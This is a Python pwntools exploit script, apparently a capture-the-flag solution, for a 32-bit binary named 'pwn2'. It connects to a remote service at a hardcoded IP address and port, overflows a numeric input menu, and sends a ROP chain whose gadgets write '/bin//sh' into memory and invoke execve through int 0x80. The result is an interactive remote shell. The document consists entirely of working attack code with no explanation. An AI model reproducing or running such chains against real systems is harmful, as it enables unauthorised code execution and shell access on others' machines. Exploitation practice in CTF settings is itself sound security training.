from pwn import *
def sendzero():
	p.sendline('2')
	p.recvuntil(':')
	p.sendline('2')
	p.recvuntil(':')
	p.sendline('2')
	p.recv()
def sendnum(n):
	p.sendline('1')
	p.recvuntil(':')
	p.sendline(str(n))
	p.recvuntil(':')
	p.sendline('0')
	p.recv()
#p=process('./pwn2')
p=remote('120.27.156.144','8000')
p.recvuntil(':')
p.sendline('255')
p.recv()
for i in range(11):
	sendnum(i)
sendzero()
for i in range(12,16):
	sendnum(i)
sendnum(0x0806ed30) # pop edx ; pop ecx ; pop ebx ; ret
sendnum(0x080ea060) # @ .data
sendnum(0x41414141) # padding
sendnum(0x41414141) # padding
sendnum(0x080bb406) # pop eax ; ret
sendnum(0x6E69622F)
sendnum(0x08097416) # mov dword ptr [edx], eax ; pop ebx ; ret
sendnum(0x41414141) # padding
sendnum(0x0806ed30) # pop edx ; pop ecx ; pop ebx ; ret
sendnum(0x080ea064) # @ .data + 4
sendnum(0x41414141) # padding
sendnum(0x41414141) # padding
sendnum(0x080bb406) # pop eax ; ret
sendnum(0x68732F2F)
sendnum(0x08097416) # mov dword ptr [edx], eax ; pop ebx ; ret
sendnum(0x41414141) # padding
sendnum(0x0806ed30) # pop edx ; pop ecx ; pop ebx ; ret
sendnum(0x080ea068) # @ .data + 8
sendnum(0x41414141) # padding
sendnum(0x41414141) # padding
sendnum(0x08054730) # xor eax, eax ; ret
sendnum(0x08097416) # mov dword ptr [edx], eax ; pop ebx ; ret
sendnum(0x41414141) # padding
sendnum(0x080481c9) # pop ebx ; ret
sendnum(0x080ea060) # @ .data
sendnum(0x0806ed31) # pop ecx ; pop ebx ; ret
sendnum(0x080ea068) # @ .data + 8
sendnum(0x080ea060) # padding without overwrite ebx
sendnum(0x0806ed30) # pop edx ; pop ecx ; pop ebx ; ret
sendnum(0x080ea068) # @ .data + 8
sendnum(0x080ea068) # padding without overwrite ecx
sendnum(0x080ea060) # padding without overwrite ebx
sendnum(0x08054730) # xor eax, eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x0807b75f) # inc eax ; ret
sendnum(0x08049781) # int 0x80
p.sendline('5')
p.interactive()
